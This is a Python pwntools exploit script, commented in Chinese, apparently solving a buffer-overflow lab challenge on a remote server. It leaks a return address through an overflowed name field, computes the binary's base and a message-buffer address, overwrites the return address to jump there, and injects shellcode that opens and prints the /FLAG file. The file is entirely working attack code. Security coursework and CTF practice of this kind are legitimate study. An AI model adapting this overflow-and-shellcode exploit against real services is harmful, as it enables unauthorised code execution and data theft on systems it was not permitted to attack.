#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'

# 連接到服務器
r = remote('up.zoolab.org', 12342)
#r = process('./bof1')

# 生成 shellcode
shellcode = asm(
    shellcraft.pushstr('/FLAG') +
    shellcraft.open('rsp', 0) +
    shellcraft.read('rax', 'rsp', 100) +
    shellcraft.write(1, 'rsp', 'rax') +
    shellcraft.exit(0)
)

# 洩漏返回地址
r.recvuntil(b"What's your name? ")
payload = b'A' * 48 + b'BBBBBBBB'  # 56 字節，覆蓋到返回地址
r.send(payload)
r.recvuntil(b"Welcome, " + payload)
leak = r.recvline(keepends=False)[:8]
leak = leak.ljust(8, b'\x00')  # 補齊 8 字節
ret_addr = u64(leak)
log.info(f"Leaked return address: {hex(ret_addr)}")

# 計算基址和 msg 地址
main_ret_offset = 0x9C99  # main 的 ret 指令偏移
base_addr = ret_addr - main_ret_offset
log.info(f"Base address: {hex(base_addr)}")
msg_offset = 0xef220  # msg 變量偏移
msg_addr = base_addr + msg_offset
log.info(f"msg address: {hex(msg_addr)}")

# 輸入 buf2
r.recvuntil(b"What's the room number? ")
r.send(b'room\n')

# 輸入 buf3（溢出返回地址）
r.recvuntil(b"What's the customer's name? ")
payload = b'A' * 8 * 19 + p64(msg_addr)  # 48 字節偏移
r.send(payload)

# 輸入 msg（僅 shellcode）
r.recvuntil(b"Leave your message: ")
r.send(shellcode)

# 進入交互模式
r.interactive()